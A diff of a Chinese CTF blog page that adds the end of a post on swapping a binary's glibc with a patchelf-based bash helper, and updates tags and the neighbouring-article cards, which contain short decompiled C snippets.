+    libc_dir<span class="token operator">=</span><span class="token variable">$LIBC_DIR</span>/32/lib
+<span class="token keyword">elif</span> <span class="token punctuation">[</span> <span class="token variable">$EBIT</span> -eq <span class="token string">"64"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>
+    libc_dir<span class="token operator">=</span><span class="token variable">$LIBC_DIR</span>/64/lib
+<span class="token keyword">else</span>
+    <span class="token keyword">echo</span> <span class="token string">"It's not a elf file"</span>
+    <span class="token keyword">exit</span>
+<span class="token keyword">fi</span>
+
+<span class="token keyword">if</span>  <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$3</span>"</span> <span class="token punctuation">]</span> 
+<span class="token keyword">then</span>
+    patchelf --set-interpreter <span class="token variable">$libc_dir</span>/ld-<span class="token variable">$LIBC_VERSION</span>.so --set-rpath <span class="token variable">$WORKDIR</span>/ <span class="token variable">$1</span>
+<span class="token keyword">else</span>
+    patchelf --set-interpreter <span class="token variable">$libc_dir</span>/ld-<span class="token variable">$LIBC_VERSION</span>.so --set-rpath <span class="token variable">$libc_dir</span>/ <span class="token variable">$1</span>
+<span class="token keyword">fi</span>
+<span class="token keyword">echo</span> <span class="token string">"success!!!"</span></code></pre>
+<pre class=" language-bash"><code class="language-bash">clibc filename 2.23
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606830240030.png" alt="修改二进制文件"></p>
+<h4 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h4><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606829048602.png" alt="测试结果"></p>
+<p>上图可以看到用clibc修改之后(左图)和Ubuntu16自带的libc2.23加载空间没有什么区别<br><strong>注：图中看到的ld-2.23.so是链接器</strong></p>
+<h4 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h4><p><a href="https://github.com/tower111/pwn-change-libc">https://github.com/tower111/pwn-change-libc</a></p>
 
             </div>
             <hr/>
@@ -608,12 +645,12 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/wp/">
-                                    <span class="chip bg-color">wp</span>
+                                <a href="/tags/%E4%BB%8B%E7%BB%8D/">
+                                    <span class="chip bg-color">介绍</span>
                                 </a>
                             
-                                <a href="/tags/ctf/">
-                                    <span class="chip bg-color">ctf</span>
+                                <a href="/tags/%E7%8E%AF%E5%A2%83/">
+                                    <span class="chip bg-color">环境</span>
                                 </a>
                             
                         </div>
@@ -658,7 +695,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
         repo: '',
         owner: '',
         admin: null,
-        id: '2020-11-18T14-39-38',
+        id: '2020-11-30T11-42-01',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -682,57 +719,53 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/11/18/vmpwn%E6%80%BB%E7%BB%93/">
+                <a href="/2020/11/30/linux%E5%BA%93%E8%AF%B4%E6%98%8E%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E4%BF%AE%E6%94%B9%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="vmpwn总结">
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="linux库说明以及如何修改动态链接库">
                         
-                        <span class="card-title">vmpwn总结</span>
+                        <span class="card-title">linux库说明以及如何修改动态链接库</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            分析各种存储器格式初始化结构_DWORD *sub_8049570()
-{
-  _DWORD *v0; // eax
-  _DWORD *v1; // ST1C_4
-
-  v0 = malloc(0x2Cu);
-  v1 = v0;
-  *
+                            说明在ctf中共享库的问题一直是一个非常非常非常恶心的问题，这里将会介绍动态链接库的命名以及如何修改一个程序依赖的动态链接库
+命名0x7f387805e000     0x7f3878091000 r-xp    33000 0      
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-11-18
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-30
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%80%BB%E7%BB%93/" class="post-category">
-                                    总结
+                            <a href="/categories/%E6%95%B4%E7%90%86/" class="post-category">
+                                    整理
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/ctf/">
-                        <span class="chip bg-color">ctf</span>
+                    <a href="/tags/%E4%BB%8B%E7%BB%8D/">
+                        <span class="chip bg-color">介绍</span>
                     </a>
                     
-                    <a href="/tags/vmpwn/">
-                        <span class="chip bg-color">vmpwn</span>
+                    <a href="/tags/%E7%8E%AF%E5%A2%83/">
+                        <span class="chip bg-color">环境</span>
                     </a>
                     
                 </div>
@@ -746,39 +779,33 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/11/14/%E7%B2%A4%E6%B9%BE%E9%93%B6%E8%A1%8C%20(vm2)%20/">
+                <a href="/2020/11/29/cscctf_2019_final_maps/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="粤湾银行 (vm2)">
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="cscctf_2019_final_maps">
                         
-                        <span class="card-title">粤湾银行 (vm2)</span>
+                        <span class="card-title">cscctf_2019_final_maps</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            结构分析ptr指针的结构
-_DWORD *sub_8049570()
-{
-  _DWORD *v0; // eax
-  _DWORD *v1; // ST1C_4
-
-  v0 = malloc(0x2Cu);
-  v1 = v0;
-  *v
+                            代码分析源码很简单，直接贴出
+// local variable allocation has failed, the output may be wrong!
+int __cdecl main(int argc, const char *
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-14
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-29
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/vmpwn/" class="post-category">
-                                    vmpwn
+                            <a href="/categories/BUUOJ/" class="post-category">
+                                    BUUOJ
                                 </a>
                             
                             
@@ -792,8 +819,8 @@ _DWORD *sub_8049570()
                         <span class="chip bg-color">wp</span>
                     </a>
                     
-                    <a href="/tags/ctf/">
-                        <span class="chip bg-color">ctf</span>
+                    <a href="/tags/pwn/">
+                        <span class="chip bg-color">pwn</span>
                     </a>
                     
                 </div>
